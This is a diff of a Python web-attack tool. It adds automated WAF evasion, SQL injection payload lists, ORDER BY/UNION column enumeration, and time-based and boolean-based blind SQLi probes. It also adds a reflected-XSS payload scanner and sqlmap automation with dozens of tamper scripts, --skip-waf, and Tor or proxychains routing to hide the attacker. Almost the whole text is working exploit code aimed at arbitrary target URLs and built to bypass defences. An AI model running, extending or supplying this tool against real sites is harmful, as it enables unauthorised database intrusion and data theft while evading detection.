+    {"name": "No Quotes", "payload": "' OR 1=1-- -"},
+    {"name": "CHAR Function", "payload": "' OR 1=CHAR(49)-- -"},
+    {"name": "Like Operator", "payload": "' OR '1' LIKE '1"},
+    {"name": "Between Operator", "payload": "' OR 1 BETWEEN 0 AND 2-- -"},
+    {"name": "In Operator", "payload": "' OR 1 IN (1)-- -"},
+    {"name": "Not Operator", "payload": "' OR NOT 1=2-- -"},
+    {"name": "XOR Operator", "payload": "' OR 1 XOR 1-- -"},
+    {"name": "Div Operator", "payload": "' OR 1 DIV 1-- -"},
+    {"name": "True Constant", "payload": "' OR true-- -"},
+    {"name": "Versioned Comment", "payload": "'/*!OR*/'1'='1"},
+    {"name": "Optimizer Hint", "payload": "' /**/+ '1'='1"},
+]
+
+# ============================================================
+# WAF DETECTION
 # ============================================================
 
 def detect_waf(url):
     print_section(" WAF Detection ")
     print_info(f"Target: {url}")
-    
     detected_wafs = []
-    
     try:
         req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
         resp = urllib.request.urlopen(req, timeout=15)
         headers = dict(resp.headers)
         body = resp.read().decode('utf-8', errors='ignore').lower()
-        
         for waf_name, sigs in WAF_SIGNATURES.items():
             found = False
             for h in sigs["headers"]:
@@ -539,18 +464,14 @@ def detect_waf(url):
             if found:
                 detected_wafs.append(waf_name)
                 print_good(f"WAF Detected: {waf_name}")
-        
         test_url = url + ("?" if "?" not in url else "&") + "id=1' UNION SELECT * FROM users--"
-        malicious_req = urllib.request.Request(
-            test_url,
-            headers={"User-Agent": get_random_ua()}
-        )
         try:
+            malicious_req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
             malicious_resp = urllib.request.urlopen(malicious_req, timeout=10)
             if malicious_resp.getcode() in [403, 406, 429, 503]:
                 if not detected_wafs:
                     detected_wafs.append("Unknown WAF (blocked malicious payload)")
-                    print_good(f"WAF Detected: Unknown WAF (blocked malicious payload)")
+                    print_good("WAF Detected: Unknown WAF (blocked malicious payload)")
         except urllib.error.HTTPError as e:
             if e.code in [403, 406, 429, 503]:
                 if not detected_wafs:
@@ -560,160 +481,173 @@ def detect_waf(url):
                     print_info(f"WAF triggered: HTTP {e.code}")
         except:
             pass
-        
         if not detected_wafs:
             print_info("No WAF detected")
             return None
         else:
             return detected_wafs
-            
     except Exception as e:
         print_error(f"Error detecting WAF: {str(e)}")
         return None
 
 # ============================================================
-# WAF BYPASS MODULE (UNCHANGED)
+# AUTO WAF BYPASS
 # ============================================================
 
-def waf_bypass_scan(url):
-    print_section(" WAF Bypass Scan ")
-    
+def auto_waf_bypass(url):
+    print_section(" Automatic WAF Bypass ")
     if "?" not in url:
-        print_warn("No query parameters found for bypass testing")
-        return False
-    
-    print_info("Testing WAF bypass techniques...")
-    bypass_found = False
-    
-    for idx, bypass_header in enumerate(WAF_BYPASS_HEADERS):
-        ua = get_random_ua()
-        headers = {"User-Agent": ua}
-        headers.update(bypass_header)
-        
-        test_url = url + ("'" if "?" in url else "?id=1'")
-        
-        try:
-            req = urllib.request.Request(test_url, headers=headers)
-            resp = urllib.request.urlopen(req, timeout=10)
-            code = resp.getcode()
-            body = resp.read().decode('utf-8', errors='ignore')
-            
-            if code == 200:
-                for pattern in SQL_ERROR_PATTERNS:
-                    if re.search(pattern, body, re.IGNORECASE):
-                        bypass_found = True
-                        print_good(f"Bypass successful with header: {list(bypass_header.keys())[0]}")
-                        break
-                        
-        except urllib.error.HTTPError as e:
-            if e.code not in [403, 406, 429, 503]:
-                bypass_found = True
-                print_good(f"Partial bypass with header: {list(bypass_header.keys())[0]} (HTTP {e.code})")
-        except:
-            pass
-    
-    if not bypass_found:
-        print_info("Trying User-Agent rotation bypass...")
-        for ua in random.sample(USER_AGENTS, min(10, len(USER_AGENTS))):
-            test_url = url + ("'" if "?" in url else "?id=1'")
+        print_warn("No parameters to test for bypass")
+        return False, None
+    base_url = url.split("?")[0]
+    params_part = url.split("?")[1]
+    params = params_part.split("&") if params_part else []
+    successful_bypass = False
+    bypass_method = None
+    waf_detected = detect_waf(url)
+    if not waf_detected:
+        print_info("No WAF detected. Bypass not needed.")
+        return True, "No WAF"
+    print_info(f"WAF detected: {', '.join(waf_detected)}")
+    print_info(f"Attempting {len(WAF_BYPASS_TECHNIQUES_SQL)} bypass techniques...")
+    # Phase 1: Header-based bypass
+    print_info("Phase 1: Header-based bypass techniques...")
+    for bypass_header in WAF_BYPASS_HEADERS:
+        for param in params:
+            key = param.split("=")[0] if "=" in param else param
+            test_url = f"{base_url}?{key}=1' OR '1'='1"
             try:
-                req = urllib.request.Request(test_url, headers={"User-Agent": ua})
+                ua = get_random_ua()
+                headers = {"User-Agent": ua}
+                headers.update(bypass_header)
+                req = urllib.request.Request(test_url, headers=headers)
                 resp = urllib.request.urlopen(req, timeout=10)
                 if resp.getcode() == 200:
                     body = resp.read().decode('utf-8', errors='ignore')
                     for pattern in SQL_ERROR_PATTERNS:
                         if re.search(pattern, body, re.IGNORECASE):
-                            bypass_found = True
-                            print_good(f"Bypass successful with User-Agent: {ua[:50]}...")
-                            break
-                    if bypass_found:
-                        break
+                            successful_bypass = True
+                            bypass_method = f"Header: {list(bypass_header.keys())[0]}"
+                            print_good(f"Bypass successful! Method: {bypass_method}")
+                            return True, bypass_method
+                    if len(body) > 100 or "error" in body.lower():
+                        successful_bypass = True
+                        bypass_method = f"Header: {list(bypass_header.keys())[0]}"
+                        print_good(f"Bypass possible with header: {bypass_method}")
+                        return True, bypass_method
+            except urllib.error.HTTPError as e:
+                if e.code not in [403, 406, 429, 503]:
+                    successful_bypass = True
+                    bypass_method = f"Header bypass (HTTP {e.code})"
+                    print_good(f"Bypass with HTTP {e.code}")
+                    return True, bypass_method
             except:
                 continue
-    
-    if not bypass_found:
-        print_info("Trying encoded payload bypass...")
-        encoded_payloads = [
-            url + "'%20OR%20'1'%3D'1",
-            url + "'%20OR%201%3D1--%20-",
-            url + "'%20UNION%20SELECT%20NULL%2CNULL--%20-",
-            url + "'/**/OR/**/'x'='x",
-            url + "'%0AOR%0A'1'%3D'1",
-            url + "'/*!50000OR*/'1'='1",
-        ]
-        for ep in encoded_payloads:
-            try:
-                req = urllib.request.Request(ep, headers={"User-Agent": get_random_ua()})
-                resp = urllib.request.urlopen(req, timeout=10)
-                if resp.getcode() == 200:
-                    body = resp.read().decode('utf-8', errors='ignore')
-                    for pattern in SQL_ERROR_PATTERNS:
-                        if re.search(pattern, body, re.IGNORECASE):
-                            bypass_found = True
-                            print_good(f"Bypass with encoded payload: {ep[-30:]}")
-                            break
-                    if bypass_found:
-                        break
-            except:
-                continue
-    
-    if bypass_found:
-        print_good("WAF bypass successful!")
-    else:
-        print_warn("WAF bypass not successful with current techniques")
-    
-    return bypass_found
+        if successful_bypass:
+            break
+    # Phase 2: Payload-based bypass
+    if not successful_bypass:
+        print_info("Phase 2: Payload-based bypass techniques...")
+        for technique in WAF_BYPASS_TECHNIQUES_SQL:
+            for param in params:
+                key = param.split("=")[0] if "=" in param else param
+                if technique["name"] == "HPP":
+                    test_url = f"{base_url}?{technique['payload']}&{key}=1"
+                else:
+                    test_url = f"{base_url}?{key}={urllib.parse.quote(technique['payload'])}"
+                try:
+                    req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
+                    resp = urllib.request.urlopen(req, timeout=10)
+                    if resp.getcode() == 200:
+                        body = resp.read().decode('utf-8', errors='ignore')
+                        for pattern in SQL_ERROR_PATTERNS:
+                            if re.search(pattern, body, re.IGNORECASE):
+                                successful_bypass = True
+                                bypass_method = technique["name"]
+                                print_good(f"Bypass successful! Method: {bypass_method}")
+                                return True, bypass_method
+                        if "' OR '1'='1" in technique["payload"] and len(body) > 500:
+                            successful_bypass = True
+                            bypass_method = technique["name"]
+                            print_good(f"Bypass possible with: {bypass_method}")
+                            return True, bypass_method
+                except urllib.error.HTTPError as e:
+                    if e.code not in [403, 406, 429, 503]:
+                        successful_bypass = True
+                        bypass_method = f"{technique['name']} (HTTP {e.code})"
+                        print_good(f"Partial bypass: {bypass_method}")
+                        return True, bypass_method
+                except:
+                    continue
+            if successful_bypass:
+                break
+    # Phase 3: User-Agent rotation
+    if not successful_bypass:
+        print_info("Phase 3: User-Agent rotation...")
+        for ua in random.sample(USER_AGENTS, min(20, len(USER_AGENTS))):
+            for param in params:
+                key = param.split("=")[0] if "=" in param else param
+                test_url = f"{base_url}?{key}=1' UNION SELECT 1,2,3-- -"
+                try:
+                    req = urllib.request.Request(test_url, headers={"User-Agent": ua})
+                    resp = urllib.request.urlopen(req, timeout=10)
+                    if resp.getcode() == 200:
+                        body = resp.read().decode('utf-8', errors='ignore')
+                        for pattern in SQL_ERROR_PATTERNS:
+                            if re.search(pattern, body, re.IGNORECASE):
+                                successful_bypass = True
+                                bypass_method = f"UA: {ua[:30]}..."
+                                print_good(f"Bypass with User-Agent rotation!")
+                                return True, bypass_method
+                except:
+                    continue
+    if not successful_bypass:
+        print_warn("All bypass techniques failed against this WAF")
+    return successful_bypass, bypass_method
 
 # ============================================================
-# COLUMN DETECTION MODULE (UNCHANGED)
+# FIXED COLUMN DETECTION
 # ============================================================
 
-def detect_columns(url):
+def detect_columns_fixed(url):
     print_section(" Column Detection ")
-    
     if "?" not in url:
         print_warn("No parameters found for column detection")
         return None, []
-    
     base_url = url.split("?")[0]
-    params = url.split("?")[1] if "?" in url else ""
-    
-    print_info("Detecting number of columns using ORDER BY technique...")
-    
+    params_part = url.split("?")[1] if "?" in url else ""
+    print_info("Detecting number of columns using ORDER BY and UNION techniques...")
     max_columns = 0
     vulnerable_params = []
-    
     param_pairs = []
-    if "&" in params:
-        for p in params.split("&"):
+    if "&" in params_part:
+        for p in params_part.split("&"):
             key = p.split("=")[0] if "=" in p else p
             param_pairs.append(key)
     else:
-        key = params.split("=")[0] if "=" in params else params
+        key = params_part.split("=")[0] if "=" in params_part else params_part
         param_pairs.append(key)
-    
     for param in param_pairs:
         print_info(f"Testing parameter: {param}")
-        for cols in range(1, 51):
+        for cols in range(1, 31):
             test_url = f"{base_url}?{param}=1' ORDER BY {cols}-- -"
             try:
                 req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                 resp = urllib.request.urlopen(req, timeout=10)
                 body = resp.read().decode('utf-8', errors='ignore')
-                
-                if re.search(r"Unknown column|order by|ORDER BY", body, re.IGNORECASE) or "error" in body.lower():
-                    max_columns = cols - 1
-                    break
-                else:
+                if "Unknown column" not in body and "order by" not in body.lower()[:200]:
                     max_columns = cols
-                    
+                else:
+                    if cols > 1:
+                        max_columns = cols - 1
+                    break
             except urllib.error.HTTPError as e:
                 if e.code in [500, 404]:
-                    max_columns = cols - 1
+                    if cols > 1:
+                        max_columns = cols - 1
                     break
                 elif e.code in [403, 406, 503]:
-                    print_warn(f"WAF blocked request at column {cols}, trying bypass...")
-                    bypass_found = False
+                    bypass_worked = False
                     for bh in random.sample(WAF_BYPASS_HEADERS, 5):
                         h = {"User-Agent": get_random_ua()}
                         h.update(bh)
@@ -721,32 +655,33 @@ def detect_columns(url):
                             req2 = urllib.request.Request(test_url, headers=h)
                             resp2 = urllib.request.urlopen(req2, timeout=10)
                             body2 = resp2.read().decode('utf-8', errors='ignore')
-                            if re.search(r"Unknown column|order by", body2, re.IGNORECASE):
-                                max_columns = cols - 1
-                                bypass_found = True
+                            if "Unknown column" not in body2:
+                                max_columns = cols
+                                bypass_worked = True
                                 break
                             else:
-                                max_columns = cols
-                                bypass_found = True
+                                if cols > 1:
+                                    max_columns = cols - 1
+                                bypass_worked = True
                                 break
                         except:
                             continue
-                    if not bypass_found:
-                        print_warn("Could not bypass WAF for column detection")
+                    if not bypass_worked:
                         break
                 else:
-                    max_columns = cols - 1
+                    if cols > 1:
+                        max_columns = cols - 1
                     break
             except:
-                max_columns = cols - 1
+                if cols > 1:
+                    max_columns = cols - 1
                 break
-        
+            time.sleep(0.3)
         if max_columns > 0:
             vulnerable_params.append(param)
-            print_good(f"Parameter '{param}' has {max_columns} columns")
-    
+            print_good(f"Parameter '{param}' has {max_columns} columns (ORDER BY)")
     if max_columns == 0:
-        print_info("Trying UNION SELECT NULL technique...")
+        print_info("ORDER BY failed. Trying UNION SELECT NULL technique...")
         for param in param_pairs:
             for cols in range(1, 21):
                 nulls = ",".join(["NULL"] * cols)
@@ -755,56 +690,142 @@ def detect_columns(url):
                     req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                     resp = urllib.request.urlopen(req, timeout=10)
                     body = resp.read().decode('utf-8', errors='ignore')
-                    if "Column count doesn't match" not in body and "has the same number of columns" not in body:
+                    if "Column count doesn't match" not in body and "has the same number" not in body:
                         max_columns = cols
                         vulnerable_params.append(param)
                         print_good(f"Parameter '{param}' has {max_columns} columns (UNION technique)")
                         break
+                except urllib.error.HTTPError:
+                    max_columns = cols
+                    vulnerable_params.append(param)
+                    print_good(f"Parameter '{param}' has {max_columns} columns (UNION - error based)")
+                    break
                 except:
                     continue
             if max_columns > 0:
                 break
-    
     if max_columns == 0:
         print_warn("Could not detect column count automatically")
         return None, []
-    
     print_good(f"Maximum columns detected: {max_columns}")
     return max_columns, vulnerable_params
 
 # ============================================================
-# SQL INJECTION MODULE (UNCHANGED)
+# FIXED XSS DETECTION
+# ============================================================
+
+def xss_scan_fixed(url):
+    print_section(" XSS Scan ")
+    if "?" not in url:
+        print_warn("No parameters to test for XSS")
+        return []
+    base_url = url.split("?")[0]
+    params_part = url.split("?")[1]
+    params = params_part.split("&") if params_part else []
+    XSS_PAYLOADS = [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "'><script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<ScRiPt>alert(1)</ScRiPt>",
+        "%3Cscript%3Ealert(1)%3C/script%3E",
+        "\" autofocus onfocus=alert(1) x=\"",
+        "';alert(String.fromCharCode(88,83,83));//",
+        "\"-alert(1)-\"",
+        "';-alert(1)-'",
+        "<script>prompt(1)</script>",
+        "<script>confirm(1)</script>",
+        "<<SCRIPT>alert(1)</SCRIPT>",
+        "<SCRIPT>alert(1);</SCRIPT>",
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<body onload=alert(1)>",
+        "<input autofocus onfocus=alert(1)>",
+        "<details/open/ontoggle=alert(1)>",
+        "<marquee onstart=alert(1)>",
+        "<isindex type=image src=1 onerror=alert(1)>",
+        "javascript:alert(1)",
+        "\"><svg/onload=alert(1)>",
+        "'-alert(1)-'",
+        "1\"><script>alert(1)</script>",
+        "<script>eval(atob('YWxlcnQoMSk='))</script>",
+    ]
+    vulnerable = []
+    for param in params:
+        key = param.split("=")[0] if "=" in param else param
+        print_info(f"Testing parameter: {key}")
+        for payload in XSS_PAYLOADS:
+            test_url = f"{base_url}?{key}={urllib.parse.quote(payload)}"
+            try:
+                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
+                resp = urllib.request.urlopen(req, timeout=10)
+                body = resp.read().decode('utf-8', errors='ignore')
+                decoded_payload = urllib.parse.unquote(payload)
+                if decoded_payload in body:
+                    vulnerable.append((key, payload, "Reflected"))
+                    print_good(f"XSS found in '{key}' - Payload reflected directly")
+                    break
+                elif payload in body:
+                    vulnerable.append((key, payload, "Reflected (encoded)"))
+                    print_good(f"XSS found in '{key}' - Payload reflected (encoded form)")
+                    break
+                else:
+                    sanitized_checks = [
+                        decoded_payload.replace("<", "&lt;").replace(">", "&gt;"),
+                        decoded_payload.replace("<script>", "").replace("</script>", ""),
+                        decoded_payload.lower(),
+                    ]
+                    for check in sanitized_checks:
+                        if check in body.lower() and len(check) > 5:
+                            print_warn(f"Partial reflection in '{key}' - may be sanitized")
+                            break
+            except urllib.error.HTTPError as e:
+                if e.code == 200:
+                    try:
+                        body = e.read().decode('utf-8', errors='ignore')
+                        decoded_payload = urllib.parse.unquote(payload)
+                        if decoded_payload in body or payload in body:
+                            vulnerable.append((key, payload, "Reflected (200 error)"))
+                            print_good(f"XSS found in '{key}' - Payload reflected")
+                            break
+                    except:
+                        pass
+            except:
+                continue
+        if not any(v[0] == key for v in vulnerable):
+            print_info(f"Parameter '{key}' appears not vulnerable to XSS")
+    if vulnerable:
+        print_section(" XSS Results ")
+        for v in vulnerable:
+            print_good(f"Parameter: {v[0]}, Payload: {v[1][:50]}, Type: {v[2]}")
+    return vulnerable
+
+# ============================================================
+# SQL INJECTION SCAN (Enhanced)
 # ============================================================
 
 def sql_injection_scan(url):
     print_section(" SQL Injection Scan ")
-    
     if "?" not in url:
         print_warn("No parameters to test for SQL injection")
-        return
-    
+        return []
     base_url = url.split("?")[0]
     params_part = url.split("?")[1] if "?" in url else ""
     params = params_part.split("&") if params_part else []
-    
     vulnerable = []
-    
     for param in params:
         key = param.split("=")[0] if "=" in param else param
         print_info(f"Testing parameter: {key}")
-        
         for payload in WAF_BYPASS_PAYLOADS_SQLI[:15]:
             test_url = f"{base_url}?{key}={urllib.parse.quote(payload)}"
             try:
                 req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                 resp = urllib.request.urlopen(req, timeout=10)
                 body = resp.read().decode('utf-8', errors='ignore')
-                
                 for pattern in SQL_ERROR_PATTERNS:
                     if re.search(pattern, body, re.IGNORECASE):
                         vulnerable.append((key, payload, pattern))
                         print_good(f"SQL Injection found in '{key}' with payload: {payload[:40]}")
-                        print_good(f"Error pattern: {pattern}")
                         break
                 if vulnerable:
                     break
@@ -822,785 +843,844 @@ def sql_injection_scan(url):
                     pass
             except:
                 continue
-        
         if not any(v[0] == key for v in vulnerable):
             print_info(f"Parameter '{key}' appears not vulnerable to SQL injection")
-    
     if vulnerable:
         print_section(" SQL Injection Results ")
         for v in vulnerable:
-            print_good(f"Parameter: {v[0]}")
-            print_good(f"Payload: {v[1]}")
-            print_good(f"Error: {v[2]}")
-            print()
+            print_good(f"Parameter: {v[0]}, Payload: {v[1]}, Error: {v[2]}")
     else:
         print_warn("No SQL injection vulnerabilities detected")
-    
     return vulnerable
 
 # ============================================================
-# ORIGINAL SQLMAP AUTOMATION (Preserved)
+# VULNERABLE COLUMN FINDER
 # ============================================================
 
-def run_sqlmap_automation(url):
-    """Original sqlmap automation - preserved for backward compatibility"""
-    print_section(" SQLMap Automation ")
-    
+def find_vulnerable_columns(url, num_columns, params):
+    print_section(" Vulnerable Column Detection ")
+    if not num_columns or num_columns == 0:
+        print_warn("No column count available")
+        return None
+    base_url = url.split("?")[0]
+    vulnerable_cols = []
+    print_info(f"Testing {num_columns} columns for injection points...")
+    for col_num in range(1, num_columns + 1):
+        cols = []
+        for i in range(1, num_columns + 1):
+            if i == col_num:
+                cols.append("'test'")
+            else:
+                cols.append("NULL")
+        nulls = ",".join(cols)
+        for param in params:
+            test_url = f"{base_url}?{param}=1' UNION SELECT {nulls}-- -"
+            try:
+                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
+                resp = urllib.request.urlopen(req, timeout=10)
+                body = resp.read().decode('utf-8', errors='ignore')
+                if "test" in body:
+                    vulnerable_cols.append(col_num)
+                    print_good(f"Column {col_num} is injectable (string)")
+                    break
+            except urllib.error.HTTPError as e:
+                if e.code == 200:
+                    try:
+                        body = e.read().decode('utf-8', errors='ignore')
+                        if "test" in body:
+                            vulnerable_cols.append(col_num)
+                            print_good(f"Column {col_num} is injectable (string)")
+                            break
+                    except:
+                        pass
+                elif e.code not in [403, 406, 429]:
+                    vulnerable_cols.append(col_num)
+                    print_good(f"Column {col_num} may be injectable (HTTP {e.code})")
+                    break
+            except:
+                continue
+    if vulnerable_cols:
+        print_good(f"Vulnerable columns: {vulnerable_cols}")
+    else:
+        print_warn("No vulnerable columns found")
+    return vulnerable_cols if vulnerable_cols else None
+
+# ============================================================
+# AUTO SQLI SCAN (Error + Time + Boolean)
+# ============================================================
+
+def auto_sqli_scan(url):
+    print_section(" Automatic SQL Injection Scan ")
+    if "?" not in url:
+        print_warn("No parameters to test for SQL injection")
+        return [], None
+    base_url = url.split("?")[0]
+    params_part = url.split("?")[1]
+    params = params_part.split("&") if params_part else []
+    all_vulnerable = []
+    # Phase 1: Error-based
+    print_info("Phase 1: Error-based detection...")
+    error_results = sql_injection_scan(url)
+    if error_results:
+        all_vulnerable.extend(error_results)
+    # Phase 2: Time-based blind
+    if not all_vulnerable:
+        print_info("Phase 2: Time-based blind detection...")
+        for param in params:
+            key = param.split("=")[0] if "=" in param else param
+            time_payloads = [
+                f"1' AND SLEEP(4)-- -",
+                f"1' AND BENCHMARK(5000000,MD5('test'))-- -",
+                f"1' WAITFOR DELAY '0:0:4'-- -",
+                f"1' OR SLEEP(4)-- -",
+                f"1' AND pg_sleep(4)-- -",
+            ]
+            for payload in time_payloads:
+                test_url = f"{base_url}?{key}={urllib.parse.quote(payload)}"
+                start = time.time()
+                try:
+                    req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
+                    resp = urllib.request.urlopen(req, timeout=20)
+                    elapsed = time.time() - start
+                    if elapsed > 3.5:
+                        all_vulnerable.append((key, payload, f"Time-based ({elapsed:.2f}s)"))
+                        print_good(f"Time-based SQLi found in '{key}' ({elapsed:.2f}s)")
+                        break
+                except:
+                    continue
+    # Phase 3: Boolean-based
+    if not all_vulnerable:
+        print_info("Phase 3: Boolean-based detection...")
+        for param in params:
+            key = param.split("=")[0] if "=" in param else param
+            true_url = f"{base_url}?{key}=1' AND 1=1-- -"
+            false_url = f"{base_url}?{key}=1' AND 1=2-- -"
+            try:
+                req_true = urllib.request.Request(true_url, headers={"User-Agent": get_random_ua()})
+                resp_true = urllib.request.urlopen(req_true, timeout=10)
+                body_true = resp_true.read().decode('utf-8', errors='ignore')
+                len_true = len(body_true)
+                req_false = urllib.request.Request(false_url, headers={"User-Agent": get_random_ua()})
+                resp_false = urllib.request.urlopen(req_false, timeout=10)
+                body_false = resp_false.read().decode('utf-8', errors='ignore')
+                len_false = len(body_false)
+                if abs(len_true - len_false) > 50:
+                    all_vulnerable.append((key, "Boolean Blind", f"Length diff: {len_true} vs {len_false}"))
+                    print_good(f"Boolean-based SQLi found in '{key}'")
+                    break
+            except:
+                continue
+    # Phase 4: Column detection
+    max_cols, vuln_params = detect_columns_fixed(url)
+    vuln_cols = None
+    if max_cols and vuln_params:
+        vuln_cols = find_vulnerable_columns(url, max_cols, vuln_params)
+    return all_vulnerable, vuln_cols
+
+# ============================================================
+# SQLMAP WITH AUTO BYPASS
+# ============================================================
+
+def auto_sqlmap_with_bypass(url):
+    print_section(" SQLMap Auto (WAF Bypass + Low Reset) ")
     sqlmap_path = shutil.which("sqlmap")
     if not sqlmap_path:
-        print_warn("sqlmap not found. Checking if sqlmap.py exists in common locations...")
         common_paths = [
             os.path.expanduser("~/sqlmap/sqlmap.py"),
             "/usr/share/sqlmap/sqlmap.py",
             "/opt/sqlmap/sqlmap.py",
-            os.path.expanduser("~/sqlmap-dev/sqlmap.py"),
             "/data/data/com.termux/files/home/sqlmap/sqlmap.py"
         ]
         for sp in common_paths:
             if os.path.exists(sp):
                 sqlmap_path = sp
-                print_good(f"sqlmap found at {sp}")
                 break
-    
     if not sqlmap_path:
-        print_error("sqlmap not found. Please install sqlmap first.")
-        print_info("Install with: apt install sqlmap")
+        print_error("sqlmap not found!")
+        print_info("Install: apt install sqlmap")
         return
-    
-    print_info(f"Launching sqlmap against: {url}")
-    
-    output_dir = f"sqlmap_output_{int(time.time())}"
-    
+    bypass_success, bypass_method = auto_waf_bypass(url)
+    if bypass_success:
+        print_good(f"WAF bypass available: {bypass_method}")
+    if not check_tor_status():
+        print_warn("Tor not running! Attempting to start...")
+        start_tor()
     cmd = [
-        sys.executable if sqlmap_path.endswith(".py") else sqlmap_path,
-        "-u", url,
-        "--batch",
-        "--random-agent",
-        "--tamper", "between,randomcase,space2comment,space2plus",
-        "--level", "3",
-        "--risk", "2",
-        "--output-dir", output_dir,
-        "--threads", "5",
-        "--time-sec", "5",
-        "--dbs"
+        sqlmap_path, "-u", url, "--batch", "--random-agent",
+        "--level=3", "--risk=2", "--threads=2", "--time-sec=3",
+        "--retries=10", "--delay=1", "--flush-session", "--fresh-queries",
+        "--smart", "--skip-waf", "--disable-coloring",
+        "--tamper=between,randomcase,space2comment,space2plus,space2dash,space2mssqlblank,space2mysqlblank,apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,escapequotes,greatest,halfversionedmorekeywords,ifnull2ifisnull,informationschemacomment,inlinequery,integration,least,lowercase,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,overlongutf8,percentage,randomcase,randomcomments,securesphere,sp_password,space2comment,space2dash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,symboliclogical,unionalltounion,unmagicquotes,uppercase,varnish,vbkeyword,versionedkeywords,versionedmorekeywords,xforwardedfor"
     ]
-    
-    if sqlmap_path.endswith(".py"):
-        cmd = [sys.executable, sqlmap_path] + cmd[1:]
-    
-    print_info(f"Command: {' '.join(cmd)}")
-    print_info("Running sqlmap (this may take a while)...")
-    
+    if TOR_RUNNING:
+        cmd.extend(["--tor", "--tor-type=SOCKS5", "--tor-port=9050"])
+        print_good("Tor integration enabled")
+    check_proxychains()
+    if PROXYCHAINS_AVAILABLE:
+        cmd = get_proxychains_cmd() + cmd
+        print_good("Proxychains enabled")
+    print_info(f"Running sqlmap with full WAF bypass...")
     try:
-        process = subprocess.Popen(
-            cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            universal_newlines=True
-        )
-        
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
         for line in iter(process.stdout.readline, ""):
             line = line.strip()
-            if line:
-                if "[SUCCESS]" in line or "identified" in line.lower():
-                    print_good(f"sqlmap: {line}")
-                elif "[WARNING]" in line or "not" in line.lower():
-                    print_warn(f"sqlmap: {line}")
-                elif "[ERROR]" in line:
-                    print_error(f"sqlmap: {line}")
-                elif "[INFO]" in line:
-                    print_info(f"sqlmap: {line}")
-                elif "available databases" in line.lower():
-                    print_good(f"sqlmap: {line}")
-                else:
-                    print(f"  {YELLOW}sqlmap:{NC} {line}")
-        
+            if not line:
+                continue
+            if "connection reset" in line.lower():
+                print_warn(f"sqlmap: Connection reset - retrying...")
+            elif "CRITICAL" in line and "connection reset" not in line.lower():
+                print_error(f"sqlmap: {line}")
+            elif "WARNING" in line and "pre-connect" not in line.lower():
+                print_warn(f"sqlmap: {line}")
+            elif "SUCCESS" in line or "identified" in line.lower() or "database" in line.lower():
+                print_good(f"sqlmap: {line}")
+            elif "INFO" in line:
+                print_info(f"sqlmap: {line}")
+            else:
+                print(f"  {line}")
         process.wait()
         if process.returncode == 0:
-            print_good("sqlmap scan completed successfully")
+            print_good("sqlmap completed successfully!")
         else:
             print_warn(f"sqlmap exited with code {process.returncode}")
-            
-    except FileNotFoundError:
-        print_error("Could not execute sqlmap command")
     except Exception as e:
-        print_error(f"Error running sqlmap: {str(e)}")
+        print_error(f"Error: {e}")
 
 # ============================================================
-# WEB CRAWLING MODULE (UNCHANGED)
+# CMS AUTO DETECTION + WORDPRESS SCAN
 # ============================================================
 
-def web_crawl(url, max_pages=30):
-    print_section(" Web Crawling ")
-    
-    visited = set()
-    to_visit = [url]
-    found_urls = []
-    base_domain = extract_domain(url)
-    
-    while to_visit and len(visited) < max_pages:
-        current_url = to_visit.pop(0)
-        if current_url in visited:
-            continue
-        
-        visited.add(current_url)
-        found_urls.append(current_url)
-        print_info(f"Crawling: {current_url}")
-        
-        try:
-            req = urllib.request.Request(
-                current_url,
-                headers={"User-Agent": get_random_ua()}
-            )
-            resp = urllib.request.urlopen(req, timeout=10)
-            body = resp.read().decode('utf-8', errors='ignore')
-            
-            links = re.findall(r'href=[\'"]?([^\'" >]+)', body)
-            links += re.findall(r'src=[\'"]?([^\'" >]+)', body)
-            links += re.findall(r'action=[\'"]?([^\'" >]+)', body)
-            
-            for link in links:
-                if link.startswith("http"):
-                    full_url = link
-                elif link.startswith("/"):
-                    parsed = urllib.parse.urlparse(url)
-                    full_url = f"{parsed.scheme}://{parsed.netloc}{link}"
-                elif link.startswith("#"):
-                    continue
-                else:
-                    full_url = urllib.parse.urljoin(current_url, link)
-                
-                if extract_domain(full_url) == base_domain:
-                    full_url = full_url.split("#")[0]
-                    if full_url not in visited and full_url not in to_visit:
-                        to_visit.append(full_url)
-                        if len(visited) + len(to_visit) > max_pages * 2:
-                            break
-            
-        except Exception as e:
-            print_warn(f"Error crawling {current_url}: {str(e)[:50]}")
-    
-    print_good(f"Crawled {len(found_urls)} URLs")
-    
-    print_info("Categorizing found URLs...")
-    
-    print_section(" Crawled URLs ")
-    for u in found_urls:
-        print(f"  {GREEN}[URL]{NC} {u}")
-    
-    return found_urls
-
-# ============================================================
-# PORT SCANNING MODULE (UNCHANGED)
-# ============================================================
-
-def scan_ports(target, ports=None, threads=50):
-    print_section(" Port Scanning ")
-    
-    if ports is None:
-        ports = COMMON_PORTS
-    
-    try:
-        ip = socket.gethostbyname(extract_domain(target))
-        print_info(f"Resolved to IP: {ip}")
-    except:
-        ip = extract_domain(target)
-        print_warn(f"Could not resolve hostname, using: {ip}")
-    
-    open_ports = []
-    scan_queue = queue.Queue()
-    result_queue = queue.Queue()
-    
-    for port in ports:
-        scan_queue.put(port)
-    
-    def scan_worker():
-        while not scan_queue.empty():
-            try:
-                port = scan_queue.get_nowait()
-            except:
-                break
-            
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(2)
-                result = sock.connect_ex((ip, port))
-                sock.close()
-                
